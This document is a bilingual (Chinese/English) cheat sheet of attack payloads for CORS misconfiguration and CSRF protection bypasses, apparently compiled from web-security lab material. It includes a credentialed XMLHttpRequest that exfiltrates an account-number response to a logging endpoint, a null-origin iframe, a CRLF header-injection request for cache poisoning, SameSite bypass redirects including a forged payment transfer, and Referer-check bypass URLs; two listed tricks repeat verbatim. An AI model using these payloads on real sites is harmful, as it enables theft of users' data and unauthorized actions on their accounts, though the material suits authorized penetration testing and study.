针对CORS，Access-Control-Allow-Credentials: true 是关键。
CORS仅仅对cookie类认证有用，对header authtication没有用。
CORS可以获取response，但CSRF仅能让目标用户的浏览器发出request，无法获取服务器响应数据。
CSRF使用HTML来构建请求，无需考虑同源策略，但请求数据内容受限；使用AJax来构建请求（比如对JSON的POST请求），其实就是CORS攻击，需要验证服务器同源策略。

基本payload

<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open("GET", "https://api.contosoapp.com/v2/getAccountNumber ", true);
   req.withCredentials = true;
   req.send();
   function reqListener() {
       location='/log?resp='+this.responseText;
   };
</script> 

The null origin：
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,<script>*cors stuff here*</script>’></iframe>

高级技巧：
1.Client-Side cache poisoning： reflected XSS in a custom HTTP header --> CORS --> client-side caching
2.Server-side cache poisoning: 如果服务器未对CORS值中特殊字符做校验，利用\r等特殊字符，可实现修改response的header。 如果服务器使用cache，则可攻击其他用户。
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7

HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7

绕过CSRF防护机制的技巧：
1. Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.

2. Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.

3. Attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.

4. In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. 

5. Applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. 

6. Bypassing SameSite Lax restrictions：
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
or
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>

7. If a cookie is set with the SameSite=Strict attribute, browsers won't include it in any cross-site requests. One possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters. For some examples, see our materials on DOM-based open redirection or sub-domain XSS.

8. if a website doesn't include a SameSite attribute when setting a cookie, Chrome automatically applies Lax restrictions by default. However, to avoid breaking single sign-on (SSO) mechanisms, it doesn't actually enforce these restrictions for the first 120 seconds on top-level POST requests. As a result, there is a two-minute window in which users may be susceptible to cross-site attacks.
# Bypass the popup blocker
window.onclick = () => {
    window.open('https://vulnerable-website.com/login/sso');
}

9. Some applications validate the Referer header when it is present in requests but skip the validation if the header is omitted.
<meta name="referrer" content="never">

10. if the application validates that the domain in the Referer starts with the expected value, then the attacker can place this as a subdomain of their own domain:
http://vulnerable-website.com.attacker-website.com/csrf-attack
Likewise, if the application simply validates that the Referer contains its own domain name, then the attacker can place the required value elsewhere in the URL:
http://attacker-website.com/csrf-attack?vulnerable-website.com

#You can override this behavior by making sure that the response containing your exploit has the Referrer-Policy: unsafe-url header set 
